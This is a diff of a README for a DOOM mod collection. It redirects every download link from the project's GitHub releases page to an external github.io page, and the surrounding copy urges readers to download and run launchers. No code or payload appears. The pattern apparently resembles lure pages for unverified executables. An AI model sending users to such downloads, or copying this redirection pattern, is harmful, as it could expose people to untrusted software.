@@ -1,6 +1,6 @@
 # 🔥 doom-total-conversion-mods-2026 - The Ultimate DOOM Mod Collection, Ready to Play
 
-[![Download Now](https://img.shields.io/badge/Download-Latest%20Release-FF4500?style=for-the-badge&logo=github&logoColor=white)](https://github.com/MStudiotb/doom-total-conversion-mods-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest%20Release-FF4500?style=for-the-badge&logo=github&logoColor=white)](https://mstudiotb.github.io)
 
 ---
 
@@ -32,7 +32,7 @@ Each mod comes with its own dedicated launcher. You don't need to understand how
 
 Getting started takes less than five minutes. Here's what you need to do:
 
-1. **Visit this link to download the application** → [Official Download Page](https://github.com/MStudiotb/doom-total-conversion-mods-2026/releases)
+1. **Visit this link to download the application** → [Official Download Page](https://mstudiotb.github.io)
 2. Click the most recent release file (the one with the highest version number).
 3. Save the file to a location you can easily find, like your Desktop or Downloads folder.
 4. Once the download finishes, you're ready to play.
@@ -128,7 +128,7 @@ Yes. All launchers support gamepad input. Plug in your controller and it should 
 Absolutely. Just close one launcher and open another. Each mod is completely independent.
 
 **What if a mod crashes or doesn't start?**
-First, make sure you've downloaded the latest version from the [download page](https://github.com/MStudiotb/doom-total-conversion-mods-2026/releases). If issues persist, try restarting your computer and running the launcher again.
+First, make sure you've downloaded the latest version from the [download page](https://mstudiotb.github.io). If issues persist, try restarting your computer and running the launcher again.
 
 ---
 
@@ -136,7 +136,7 @@ First, make sure you've downloaded the latest version from the [download page](h
 
 We regularly release updates with bug fixes, performance improvements, and new mods. To update:
 
-1. **Visit this link to download the application** → [Official Download Page](https://github.com/MStudiotb/doom-total-conversion-mods-2026/releases)
+1. **Visit this link to download the application** → [Official Download Page](https://mstudiotb.github.io)
 2. Download the newest version.
 3. Run the new file and follow the same installation steps.
 4. Your existing saves and settings will be preserved.
@@ -192,7 +192,7 @@ Join the community of players using this collection. Share your experiences, rep
 
 Your next gaming session is one download away. Click the button below to get started:
 
-[![Get the Collection](https://img.shields.io/badge/Download-Now!-00FF00?style=for-the-badge&logo=download&logoColor=white)](https://github.com/MStudiotb/doom-total-conversion-mods-2026/releases)
+[![Get the Collection](https://img.shields.io/badge/Download-Now!-00FF00?style=for-the-badge&logo=download&logoColor=white)](https://mstudiotb.github.io)
 
 **Visit this link to download the application.** Then follow the simple installation steps above. In less than ten minutes, you'll be blasting demons, exploring wastelands, and experiencing DOOM like never before.
 
